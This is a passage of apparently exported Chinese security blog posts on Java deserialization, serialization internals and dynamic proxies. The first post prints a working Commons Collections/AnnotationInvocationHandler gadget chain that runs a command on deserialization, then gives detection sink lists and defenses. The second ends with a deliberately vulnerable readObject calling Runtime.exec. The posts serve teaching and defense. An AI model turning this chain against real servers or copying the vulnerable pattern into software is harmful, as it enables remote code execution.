利用类2——AnnotationInvocationHandler这里将上述分析的调用过程做个图清晰地列出来，相信应该很明确该反射链执行的过程了： 最终构造的代码 123456789101112131415161718192021222324252627282930313233343536373839public class POC_Test&#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put("value", "value"); Map outmap = TransformedMap.decorate(innermap, null, transformerChain); //通过反射获得AnnotationInvocationHandler类对象 Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); //通过反射获得cls的构造函数 Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); //这里需要设置Accessible为true，否则序列化失败 ctor.setAccessible(true); //通过newInstance()方法实例化对象 Object instance = ctor.newInstance(Retention.class, outmap); POC_Test poc_test = new POC_Test(); poc_test.deserialize(poc_test.serialize(instance)); &#125; public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; public Object deserialize(final byte[] serialized) throws Exception &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125;&#125; 运行结果，弹出计算器： 0x04 检测方法全局搜索ObjectInputStream类，检查是否调用readObject()方法，若存在该方法则检查其是否进行了重写，若重写了readObject()方法则需严格排查是否可构造反射链来执行任意命令。 当然，结合其他几个类型的Java反序列漏洞，全局搜索的类方法如下： 1234567ObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject 0x05 防御方法1、重写ObjectInputStream的resolveClass()，设置黑白名单机制最常见的方法，就是在ObjectInputStream中设置黑白名单机制的方式进行防御。下面就在Apache Commons Collections反序列化漏洞示例代码中直接添加防御代码。 写一个SecureObjectInputStream类，继承于ObjectInputStream，重写resolveClass()方法实现黑名单机制过滤： 1234567891011121314151617181920import javax.management.BadAttributeValueExpException;import java.io.*;public class SecureObjectInputStream extends ObjectInputStream &#123; public SecureObjectInputStream(InputStream inputStream) throws IOException &#123; super(inputStream); &#125; /** * Only deserialize instances of our expected Bicycle class */ @Override protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123; if (!desc.getName().equals(BadAttributeValueExpException.class.getName())) &#123; throw new InvalidClassException("触发黑名单机制，禁止反序列化恶意类对象", desc.getName()); &#125; return super.resolveClass(desc); &#125;&#125; 接着只需在调用代码中将ObjectInputStream替换为SecureObjectInputStream来创建ObjectInputStream对象。再次运行时发现，触发黑名单机制，无法进行反序列化漏洞的利用： 2、利用SerialKiller.jar原理和上面是一样的，只是已经是成熟的轮子了可以直接使用。具体的参考https://github.com/ikkisoft/SerialKiller 创建sk.conf配置文件在本地项目根目录中，其中只设置了黑名单过滤BadAttributeValueExpException： 1234567891011121314151617&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- serialkiller.conf --&gt;&lt;config&gt; &lt;refresh&gt;6000&lt;/refresh&gt; &lt;mode&gt; &lt;profiling&gt;false&lt;/profiling&gt; &lt;/mode&gt; &lt;logging&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/logging&gt; &lt;blacklist&gt; &lt;regexp&gt;.*BadAttributeValueExpException$&lt;/regexp&gt; &lt;/blacklist&gt; &lt;whitelist&gt; &lt;regexp&gt;.*&lt;/regexp&gt; &lt;/whitelist&gt;&lt;/config&gt; 将SerialKiller.jar添加进Java项目中，并将其替换掉ObjectInputStream来创建ObjectInputStream对象。运行后发现，黑名单过滤了BadAttributeValueExpException类并抛出错误无法往下执行： 3、禁止JVM执行外部命令Runtime.exec通过扩展SecurityManager可以实现，这里添加一个函数，在进行反序列化操作之前调用即可： 123456789101112131415161718192021222324252627282930313233343536public static void noSerial()&#123; SecurityManager originalSecurityManager = System.getSecurityManager(); if (originalSecurityManager == null) &#123; // 创建自己的SecurityManager SecurityManager sm = new SecurityManager() &#123; private void check(Permission perm) &#123; // 禁止exec if (perm instanceof java.io.FilePermission) &#123; String actions = perm.getActions(); if (actions != null &amp;&amp; actions.contains("execute")) &#123; throw new SecurityException("execute denied!"); &#125; &#125; // 禁止设置新的SecurityManager，保护自己 if (perm instanceof java.lang.RuntimePermission) &#123; String name = perm.getName(); if (name != null &amp;&amp; name.contains("setSecurityManager")) &#123; throw new SecurityException("System.setSecurityManager denied!"); &#125; &#125; &#125; @Override public void checkPermission(Permission perm) &#123; check(perm); &#125; @Override public void checkPermission(Permission perm, Object context) &#123; check(perm); &#125; &#125;; System.setSecurityManager(sm); &#125;&#125; 将创建ObjectInputStream对象的语句换回原来的ObjectInputStream类，在反序列化之前调用前面定义的函数noSerial()，运行发现，无报错，也没有弹出计算器，即防御成功： 0x06 参考Java反序列化漏洞的原理分析 Java反序列化漏洞从入门到深入 Java反序列化漏洞分析 浅析Java序列化和反序列化 深入理解 JAVA 反序列化漏洞]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java序列化和反序列化机制]]></title>
    <url>%2F2019%2F02%2F03%2FJava%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[这里主要讲解Java序列化及反序列化机制。 何为序列化Java 提供了一种对象序列化的机制：一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。整个过程都是JVM独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 序列化：把对象转换为字节序列的过程。 反序列化：把字节序列恢复为对象的过程。 为何设计序列化1、可以弥补不同操作系统之间的差异，如Windows上创建的对象进行序列化后通过网络传到Linux上可直接反序列化得到该对象而无需担心数据在不同机器、系统上的表示会不同； 2、对Java的远程方法调用RMI是必需的。RMI是为了使得存在于其他主机上的对象使用起来像本机上的对象一样，当向远程对象发送信息时，需要通过对象序列化来传输参数和返回值； 3、对Java Bean是必需的。使用一个Bean时，一般情况下是在设计阶段对它的状态信息进行配置，然而这种状态信息需要保存下来，并在程序启动时进行后期恢复，这时是靠反序列化机制来完成的； 4、方便保存对象信息以便于下次JVM启动时可以直接使用。 序列化的条件一个类对象要想实现序列化，必须满足两个条件： 1、该类必须实现 java.io.Serializable 对象。 2、该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 如何序列化要序列化一个对象，首先要创建OutputStream对象，再将其封装在一个ObjectOutputStream对象内，接着只需调用writeObject()即可将对象序列化，并将其发送给OutputStream（对象是基于字节的，因此要使用InputStream和OutputStream来继承层次结构）。 要反序列化出一个对象，需要将一个InputStream封装在ObjectInputStream内，然后调用readObject()即可。 ObjectInputStream/ObjectOutputStream类 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外即writeObject()，其用来序列化一个对象，并将它发送到输出流： 1public final void writeObject(Object x) throws IOException 同样的，ObjectInputStream类包含反序列化一个对象的方法readObject()，其用于从流中取出下一个对象，并将对象反序列化，它的返回值为Object，因此需要将它转换成合适的数据类型： 1public final Object readObject() throws IOException, ClassNotFoundException Demo 定义一个User类，继承Serializable接口，其中address字段设置transient关键字： 1234567891011import java.io.Serializable;public class User implements Serializable &#123; public String name; public transient String address; public int number; public void info()&#123; System.out.println("Name: " + name + "\nAddress: " + address + "\nNumber: " + number); &#125;&#125; 编写一个进行序列化操作的类： 123456789101112131415161718192021222324252627import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = "Mi1k7ea"; user.address = "England"; user.number = 666; user.info(); try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]User对象已经序列化保存到user.ser文件中"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; serialize_test(); &#125;&#125; 运行后查看输出，给该User对象赋值成功并保存到了目标文件中： 用WinHex打开user.ser文件查看： 在刚刚的test.class中添加反序列化操作的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = "Mi1k7ea"; user.address = "England"; user.number = 666; user.info(); try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]User对象已经序列化保存到user.ser文件中"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream("user.ser"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println("[*]反序列化后的内容："); user.info(); &#125; public static void main(String[] args) &#123;// serialize_test(); unserialize_test(); &#125;&#125; 注意，readObject()方法中的try/catch代码块尝试捕获 ClassNotFoundException 异常。对于JVM可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个ClassNotFoundException异常。 查看反序列化结果： 可以看到反序列化出来的对象，除了Address属性外其余的属性值都成功地反序列化出来了得到几乎和序列化之前一样的对象。这里Address属性是因为设置了transient关键字，具体的原理在下面会讲解。 serialVersionUIDserialVersionUID即序列化的版本号，适用于Java的序列化机制。简单来说，Java的序列化机制是通过判断类的serialVersionUID来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常，即是InvalidCastException。 具体的序列化过程是这样的：序列化操作的时候系统会把当前类的serialVersionUID写入到序列化文件中，当反序列化时系统会去检测文件中的serialVersionUID，判断它是否与当前类的serialVersionUID一致，如果一致就说明序列化类的版本与当前类版本是一样的，可以反序列化成功，否则失败。 serialVersionUID有两种显示的生成方式： 一是默认的1L，比如：private static final long serialVersionUID = 1L； 二是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段，比如： 1private static final long serialVersionUID = xxxxL; 当一个类实现了Serializable接口，如果没有显示的定义serialVersionUID，Eclipse会提供相应的提醒。面对这种情况，我们只需要在Eclipse中点击类中warning图标一下，Eclipse就会自动给定两种生成的方式。如果不想定义，在Eclipse的设置中也可以把它关掉的，设置如下： Window ==&gt; Preferences ==&gt; Java ==&gt; Compiler ==&gt; Error/Warnings ==&gt; Potential programming problems将Serializable class without serialVersionUID的warning改成ignore即可。 当实现java.io.Serializable接口的类没有显式地定义一个serialVersionUID变量时候，Java序列化机制会根据编译的Class自动生成一个serialVersionUID作序列化版本比较用，这种情况下，如果Class文件(类名，方法明等)没有发生变化(增加空格，换行，增加注释等等)，就算再编译多次，serialVersionUID也不会变化的。 显式地定义serialVersionUID有两种用途： 1、 在某些场合，希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有相同的serialVersionUID； 2、 在某些场合，不希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有不同的serialVersionUID。 序列化的控制在某些情况下，我们可能需要对序列化的过程进行控制，比如说不需要哪些部分被反序列化等，这时可通过Externalizable接口替代Serializable接口来实现对序列化过程的控制。 1、Externalizable Externalizable接口继承了Serializable接口，同时添加了两个方法即writeExternal()和readExternal()，两者会在序列化和反序列化的过程中被自动调用，以便于执行一些特殊操作来实现过程控制。 2、transient关键字 当我们对序列化进行控制时，可能有些特殊子对象不想让Java的序列化机制自动保存和恢复，比如说子对象表示的是敏感信息。即使对象中的这些信息是private属性，但经过序列化处理后人们就可以通过读取文件或拦截数据报文来非法获取该信息。 这时存在两个方法。一是通过将类实现为前面的Externalizable，这时无任何东西可以自动序列化，并且可在writeExternal()内部只对所需部分进行显式的序列化；二是当我们正在操作的是一个Serializable对象，则所有序列化操作会自动执行，这时就可应用到transient（瞬时）关键字来逐个字段地关闭序列化，即说明指定字段内容在序列化中是不需要保存或恢复操作的。 由于Externalizable对象在默认情况下不保存它们的任何字段，所以transient关键字只能和Serializable对象一起使用。 3、自己实现Serializable 若非十分坚定地使用Externalizable接口，那么还可以自己实现Serializable接口，并添加writeObject()和readObject()方法，一旦对象被序列化和反序列化还原，就会自动地分别调用这两个方法。值得注意的是，这里说的是“添加”而非“覆盖”或“实现”，也就是说，只要我们提供了这两个方法，程序就会使用这两个方法而非默认的序列化机制。 这些方法必须具有准确的方法特征签名： 123private void writeObject(ObjectOutputStream stream) throws IOExceptionprivate void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException 注意，这些方法被定义成了private。 在调用ObjectOutputStream.writeObject()时，会检查所传递的Serializable对象，看看是否实现了自己的writeObject()，若实现了，则跳过正常的序列化过程并调用自己实现的writeObject()。readObject()方法的情形类似。 序列化的二进制格式看回刚才用WinHex打开的序列化Demo生成的user.ser文件： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 00 05：STREAM_VERSION，序列化协议版本。 0x73：TC_OBJECT，声明这是一个新的对象。 0x72：TC_CLASSDESC，声明这里开始一个新Class。 00 04：Class名字的长度，这里Class名为User，长度为4。 55 73 65 72：类名称User。 64 D4 C4 D2 26 CA C4 8D：SerialVersionUID，序列化ID，如果没有指定，则会由算法随机生成一个8byte的ID。 0x02：标记号，该值声明该对象支持序列化。 00 02：该类所包含的域个数。 0x49：域类型，49 代表”I”，也就是Int。 00 06：域名字的长度，该域名为number、长度为6。 6E 75 6D 62 65 72：域名字描述，这里为number。 0x4C：域的类型，4C代表String。 00 04：域名字的长度，该域名为name、长度为4。 6E 61 6D 65：域名字描述，这里为name。 0x74：TC_STRING，代表一个new String，用String来引用对象。 00 12：该String长度，这里String为“Ljava/lang/String;”、长度为0x12. 4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3B：JVM的标准对象签名表示法，这里是指String为“Ljava/lang/String;”。 0x78：TC_ENDBLOCKDATA，对象数据块结束的标志。 0x70：TC_NULL，说明没有其他超类的标志。 00 00 02 9A：这个暂时不知道，各位大佬知道的麻烦指点一下 ：) 0x74：TC_STRING，代表一个new String，用String来引用对象。 00 07：域名字的长度，该域名为Mi1k7ea、长度为7。 4D 69 31 6B 37 65 61：域名字描述，这里为“Mi1k7ea”。 自定义实现序列化如前面序列化的控制中的自己实现Serializable所说，可以添加writeObject()和readObject()这两个方法，它们并不属于任何的类和接口，只要在要序列化的类中提供这两个方法，就会在序列化机制中自动被调用。 自定义实现的好处是：程序员可以更加精细或者说可以去定制自己想要实现的序列化，如下面例子中将name和address变量值反转。利用这种特点，可以在序列化过程中对一些敏感信息做特殊的处理。 User.class：添加了private关键字的writeObject()和readObject()两个方法 123456789101112131415161718192021222324import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class User implements Serializable &#123; public String name; public String address; public int number; private void writeObject(ObjectOutputStream out) throws IOException &#123; System.out.println("[*]Write Object."); out.writeObject(new StringBuffer(name).reverse()); out.writeObject(new StringBuffer(address).reverse()); out.writeInt(number); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; System.out.println("[*]Read Object."); this.name = ((StringBuffer)in.readObject()).reverse().toString(); this.address = ((StringBuffer)in.readObject()).reverse().toString(); this.number = in.readInt(); &#125;&#125; test.class： 1234567891011121314151617181920212223242526272829303132333435363738394041import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = "Mi1k7ea"; user.address = "England"; user.number = 666; try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]User对象已经序列化保存到user.ser文件中"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream("user.ser"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println("Name: " + user.name + "\nAddress: " + user.address + "\nNumber: " + user.number); &#125; public static void main(String[] args) &#123; serialize_test(); unserialize_test(); &#125;&#125; 运行查看，确实是经过自己编写的writeObject()和readObject()两个方法来实现序列化和反序列化操作的： what’s more！——反序列化漏洞点 Java反序列化漏洞点通常在于自定义实现的readObject()方法的代码逻辑存在缺陷，导致可能会触发反序列化漏洞。 其实这和PHP反序列化漏洞原理差不多，PHP中是魔法函数若存在缺陷代码则可能会存在反序列化漏洞风险，这类似于Java中自定义实现的readObject()函数。 下面的例子只在前面的例子中添加if语句中的Runtime.getRuntime().exec()： User.class： 12345678910111213141516171819202122232425262728import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class User implements Serializable &#123; public String name; public String address; public int number; private void writeObject(ObjectOutputStream out) throws IOException &#123; System.out.println("[*]Write Object."); out.writeObject(new StringBuffer(name).reverse()); out.writeObject(new StringBuffer(address).reverse()); out.writeInt(number); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; System.out.println("[*]Read Object."); this.name = ((StringBuffer)in.readObject()).reverse().toString(); this.address = ((StringBuffer)in.readObject()).reverse().toString(); this.number = in.readInt(); //加了个判断，当数字为666时，进入缺陷代码逻辑块 if (this.number == 666)&#123; Runtime.getRuntime().exec(name); &#125; &#125;&#125; test.class 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); //将name字段值修改为calc命令 user.name = "calc.exe"; user.address = "England"; //将number值设置为满足if判断条件的666值 user.number = 666; try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]User对象已经序列化保存到user.ser文件中"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream("user.ser"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println("Name: " + user.name + "\nAddress: " + user.address + "\nNumber: " + user.number); &#125; public static void main(String[] args) &#123; serialize_test(); unserialize_test(); &#125;&#125; 运行代码，查看到readObject()中的不安全代码块中执行了命令： 参考深入理解JAVA I/O系列五：对象序列化 Java 序列化 java类中serialversionuid 作用 是什么?举个例子说明]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java动态代理机制]]></title>
    <url>%2F2019%2F02%2F01%2FJava%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[Java动态代理机制主要通过反射机制来实现的，下面讲解一下动态代理相关内容。 代理模式代理模式是Java中常用的设计模式，主要由公共接口、被代理类和代理类等三部分组成，代理类持有被代理类的实类，代为执行具体的类方法。其中代理类与被代理类有同样的接口。 代理类与被代理类之间通常会存在关联关系，一个代理类的对象与一个被代理类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用被代理类对象的方法来提供特定的服务。 代理模式结构图 使用代理模式的场景 (1)、设计模式中有一个设计原则是开闭原则，指修改关闭对扩展开放，当需要看非本人所写的代码时，通常很难直接修改代码，那么这时就可以通过代理对类进行增强。 (2)、在使用RPC框架时，框架本身并不能提前知道各个业务方要调用哪些接口的哪些方法 。那么这时就可通过动态代理的方式来建立一个中间人给客户端使用，也方便框架进行搭建逻辑，某种程度上也是客户端代码和框架松耦合的一种表现。 (3)、Spring的AOP机制就是采用动态代理的机制来实现切面编程。 静态代理与动态代理 根据加载被代理类的时机不同，将代理分为静态代理和动态代理。 如果在代码编译时就确定了被代理的类是哪一个，那么就可以直接使用静态代理；如果不能确定，那么可以使用类的动态加载机制，在代码运行期间加载被代理的类，这就是动态代理，比如RPC框架和Spring AOP机制。 静态代理静态代理：在代码编译时就确定了具体的被代理类。由程序员创建或特定工具自动生成源代码，也就是在编译时就已经将接口、被代理类、代理类等确定下来。在程序运行之前，代理类的.class文件就已经生成。 Demo示例 其中被代理类已经明确的在代理类代码中写出，在代码编译时就能确定出该被代理类，从而实现静态代理： 123456789101112131415161718192021222324252627public class test &#123; public static void consumer(ProxyInterface pi)&#123; pi.echo(); &#125; public static void main(String[] args) throws Exception&#123; consumer(new ProxyObject()); &#125;&#125;interface ProxyInterface &#123; void echo();&#125;class RealObject implements ProxyInterface &#123; public void echo()&#123; System.out.println("This is RealObject."); &#125;&#125;class ProxyObject implements ProxyInterface&#123; public void echo()&#123; System.out.println("AOP"); new RealObject().echo(); System.out.println("Write Log"); &#125;&#125; 可以看到，代理类ProxyObject在执行被代理类RealObject的方法前后都能够方便地添加新的功能如Spring的面向切面编程AOP，且是通过调用被代理类的方法来实现调用的而非代理类自己直接调用的： 动态代理基本概念在代码编译时未确定具体的被代理类，而在代码运行时动态加载被代理的类。在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。 注意，JDK提供的代理只能针对接口做代理。 下面来看下实现动态代理机制的Proxy类和InvocationHandler接口。 InvocationHandler接口每一个动态代理类都必须要实现InvocationHandler这个接口，并且每个代理类的实例都关联到了一个handler，当代理类对象调用一个方法的时候，这个方法的调用就会被转发为由InvocationHandler这个接口的 invoke ()方法来进行调用。 作为InvocationHandler接口唯一的方法，invoke ()方法定义如下： 1Object invoke(Object proxy, Method method, Object[] args) throws Throwable proxy参数：指代被代理类对象即真实对象； method参数：指代的是所要调用被代理类对象的某个方法的Method对象； args参数：指代的是调用被代理类对象某个方法时接受的参数； Proxy类Proxy这个类的作用就是用来动态创建一个代理对象类，它提供了许多的方法，其中用的最多的就是 newProxyInstance ()方法： 1public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException 这个方法的作用就是得到一个动态的代理类对象，其中接收三个参数： loader参数：一个ClassLoader对象，定义了由哪个ClassLoader对象来对生成的代理类对象进行加载； interfaces参数：一个Interface接口对象数组，说明将要给被代理类对象提供一组什么样的接口，如果提供了一组接口给被代理类对象，那么该对象就宣称实现了该接口(多态)，这样就能调用这组接口中的方法了； h参数：一个InvocationHandler对象，表示的是当这个动态代理对象在调用方法的时候，会关联到哪一个InvocationHandler对象上； 创建动态代理对象的具体步骤1、创建一个InvocationHandler对象 12//创建一个与代理对象相关联的InvocationHandlerInvocationHandler stuHandler = new MyInvocationHandler&lt;Person&gt;(stu); 2、使用Proxy类的getProxyClass静态方法生成一个动态代理类stuProxyClass 1Class&lt;?&gt; stuProxyClass = Proxy.getProxyClass(Person.class.getClassLoader(), new Class&lt;?&gt;[] &#123;Person.class&#125;); 3、获得stuProxyClass 中一个带InvocationHandler参数的构造器constructor 1Constructor&lt;?&gt; constructor = PersonProxy.getConstructor(InvocationHandler.class); 4、通过构造器constructor来创建一个动态实例stuProxy 1Person stuProxy = (Person) cons.newInstance(stuHandler); 当然，上面四个步骤可以通过Proxy类的newProxyInstances()方法来简化： 1234//创建一个与代理对象相关联的InvocationHandlerInvocationHandler stuHandler = new MyInvocationHandler&lt;Person&gt;(stu);//创建一个代理对象stuProxy，代理对象的每个执行方法都会替换执行Invocation中的invoke方法Person stuProxy= (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Person.class&#125;, stuHandler); Demo示例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class test &#123; public static void main(String[] args) &#123; //创建一个被代理类的对象 Subject realSubject = new RealSubject(); //通过实现InvacationHandler接口，将被代理类对象传入handler InvocationHandler handler = new DynamicProxy(realSubject); /* * 通过Proxy的newProxyInstance方法来创建代理类对象，来看看其三个参数 * 第一个参数 handler.getClass().getClassLoader() ，我们这里使用handler这个类的ClassLoader对象来加载我们的代理对象 * 第二个参数realSubject.getClass().getInterfaces()，我们这里为代理对象提供的接口是真实对象所实行的接口，表示我要代理的是该真实对象，这样我就能调用这组接口中的方法了 * 第三个参数handler， 我们这里将这个代理对象关联到了上方的 InvocationHandler 这个对象上 */ Subject subject = (Subject)Proxy.newProxyInstance(handler.getClass().getClassLoader(), realSubject.getClass().getInterfaces(), handler); System.out.println(subject.getClass().getName()); subject.send(); subject.recv(); &#125;&#125;interface Subject &#123; public void send(); public void recv();&#125;class RealSubject implements Subject &#123; public void send()&#123; System.out.println("[*]Send"); &#125; public void recv()&#123; System.out.println("[*]Recv"); &#125;&#125;class DynamicProxy implements InvocationHandler &#123; //要代理的被代理类对象 private Object subject; //构造方法，给被代理类对象赋初始值 DynamicProxy(Object subject)&#123; this.subject = subject; &#125; public Object invoke(Object object, Method method, Object[] args) throws Throwable&#123; //在代理真实对象前可以添加一些功能操作 System.out.println("AOP"); System.out.println("Method: " + method); //当代理类对象调用被代理类对象的方法时，其会自动跳转到代理类对象关联的handler对象的invoke()方法来进行调用 method.invoke(subject, args); //在代理真实对象后也可以添加一些功能操作 System.out.println("Write Logs"); return null; &#125;&#125; 再次提醒，JDK提供的代理只能是针对接口做代理，也就是说调用newProxyInstance()返创建代理类对象时回的必须要是一个接口。 观察输出内容： 第一行内容：”com.sun.proxy.\$Proxy0”是由输出subject.getClass().getName())的结果，我们一般会以为返回的这个代理对象会是Subject类型的对象或者是InvocationHandler的对象，然并非，原因在newProxyInstance()方法的第二个参数上，该参数给代理类对象提供了一组接口，而该对象就会实现这组接口，这时可将这个对象强制类型转化为这组接口中的任意一个，因为这里的接口是Subject类型，所以就可以将其转化为Subject类型了。另外，通过 Proxy.newProxyInstance()创建的代理对象是在JVM运行时动态生成的一个对象，并非是InvocationHandler类型，也不是定义的那组接口的类型，而是在运行时动态生成的一个对象，并且命名方式都是以$开头、Proxy为中、最后为数字（表示对象的标号）的形式。 第二行至第五行内容（后面4行内容是类似的）：”AOP”和”Write Logs”为代理过程中新添加的输出功能；中间的”[*]Send”为代理类对象调用关联的handler中的invoke()方法来执行真实的被代理类的方法；”Method：”输出的是handler中invoke()方法method参数的值，这里可看到为”public abstract void Subject.send()”，说明该方法是来自真实的被代理类对象的接口方法，也就是说，并非是代理类对象直接调用目标方法，而是通过由其关联到的handler对象的invoke()方法中来调用，从而实现代理的方式调用。 同时因为在代码编译时并不知道被代理的类是哪个，因此实现了动态代理的方式。 原理分析查看Proxy类的newProxyInstance()函数的实现代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@CallerSensitive public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException &#123; Objects.requireNonNull(h); final Class&lt;?&gt;[] intfs = interfaces.clone(); final SecurityManager sm = System.getSecurityManager(); if (sm != null) &#123; checkProxyAccess(Reflection.getCallerClass(), loader, intfs); &#125; /* * Look up or generate the designated proxy class. */ Class&lt;?&gt; cl = getProxyClass0(loader, intfs); /* * Invoke its constructor with the designated invocation handler. */ try &#123; if (sm != null) &#123; checkNewProxyPermission(Reflection.getCallerClass(), cl); &#125; final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams); final InvocationHandler ih = h; if (!Modifier.isPublic(cl.getModifiers())) &#123; AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123; public Void run() &#123; cons.setAccessible(true); return null; &#125; &#125;); &#125; return cons.newInstance(new Object[]&#123;h&#125;); &#125; catch (IllegalAccessException|InstantiationException e) &#123; throw new InternalError(e.toString(), e); &#125; catch (InvocationTargetException e) &#123; Throwable t = e.getCause(); if (t instanceof RuntimeException) &#123; throw (RuntimeException) t; &#125; else &#123; throw new InternalError(t.toString(), t); &#125; &#125; catch (NoSuchMethodException e) &#123; throw new InternalError(e.toString(), e); &#125; &#125; 可以发现只是封装了创建动态代理类的步骤。 重点关注”Class&lt;?&gt; cl = getProxyClass0(loader, intfs);”，其用于产生代理类，后面代码中的构造器也是通过这里产生的类来获得，因此可看出这个类的产生就是整个动态代理的关键。 JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。 